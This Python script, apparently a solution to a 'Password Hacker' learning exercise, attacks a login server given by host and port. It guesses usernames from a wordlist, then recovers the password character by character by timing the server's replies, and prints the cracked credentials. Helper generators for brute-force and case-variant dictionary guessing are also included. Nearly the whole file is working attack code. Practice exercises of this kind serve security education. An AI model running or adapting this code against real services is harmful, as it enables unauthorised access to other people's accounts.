import socket
import argparse
from itertools import product, chain
import json
import string
import sys
from datetime import datetime

class Client:
    def __init__(self):
        self.hostname = ''
        self.port = 0
        self.seed = string.ascii_lowercase + string.ascii_lowercase + string.ascii_letters
        self.username = ''
        self.pass_word = ''
        self.login = open('/Users/ranliu/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt',"r")

    def read_input(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('hostname')
        parser.add_argument('port', type = int)
        # parser.add_argument('msg')
        args = parser.parse_args()
        self.hostname = args.hostname
        self.port = args.port
        self.build_connection(self.hostname, self.port)

    def set_standard_time(self, hostname, port):
        with socket.socket() as client_socket:
            address = (hostname, port)
            client_socket.connect(address)
            request = json.dumps({"login": "", "password": ""})
            start = datetime.now()
            client_socket.send(request.encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = datetime.now()
            return end - start

    def build_connection(self, hostname, port):
        with socket.socket() as client_socket:
            address = (hostname, port)
            client_socket.connect(address)
            login = ""
            password = ""
            # difference = self.set_standard_time(hostname, port)
            login_dict={}
            password_dict={}
            for test in self.login.readlines():
                request = json.dumps({"login": test.strip(), "password": ""})
                client_socket.send(request.encode())
                start = datetime.now()
                response = json.loads(client_socket.recv(1024).decode())
                end = datetime.now()
                # login_dict = {test:(end - start).microseconds}
                # if response["result"] == "Exception happened during login":
                difference = (end - start).microseconds
                if difference >= 90000:
                    login = test.strip()
                    break
            # login = max(login_dict, key = login_dict.get)
            while True:
                for i in (string.ascii_lowercase + string.ascii_lowercase + string.ascii_letters):
                    request = json.dumps({"login": login, "password": password + i})
                    client_socket.send(request.encode())
                    start = datetime.now()
                    response = json.loads(client_socket.recv(1024).decode())
                    end = datetime.now()
                    difference = (end - start).microseconds
                    if difference >= 90000:
                        password += i
                        break
                    if response["result"] == "Connection success!":
                        password += i
                        admin = json.dumps({"login": login, "password": password}, indent=4)
                        print(admin)
                        self.login.close()
                        sys.exit()


    def psw_generator(self, password):
        # for length in range(1, len(self.seed) + 1):
        for psw in product(self.seed, repeat=1):
            yield ''.join(psw)

    def psw_dict(self):
        with open('/Users/ranliu/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt', 'r') as f:
            for word in f:
                s = list(map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in word))))
                for psw in s:
                    yield "".join(psw.strip('\n'))

    def login_dict(self):
        with open('/Users/ranliu/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', 'r') as f:
            for word in f.readline():
                yield word
                # s = list(map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in word))))
                # res = {"login":"", "password": " "}
                # for login in s:
                #     res["login"] = "".join(login.strip('\n'))
                #     yield res





def main():
    Client().read_input()

if __name__ == '__main__':
    main()
